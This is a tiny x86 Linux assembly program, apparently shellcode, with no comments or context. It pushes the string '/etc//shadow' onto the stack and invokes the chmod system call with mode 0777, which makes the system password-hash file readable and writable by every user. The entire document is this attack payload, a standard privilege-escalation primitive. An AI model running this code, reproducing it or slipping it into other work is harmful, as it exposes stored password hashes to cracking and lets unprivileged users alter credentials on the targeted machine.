section .text
global _start

_start: 
mov  eax,0x0 
push dword eax 
push 0x776f6461  
push 0x68732f2f 
push 0x6374652f
mov  ebx,esp 
push word 0x1ff
pop  cx 
mov  al,0xf
int  0x80

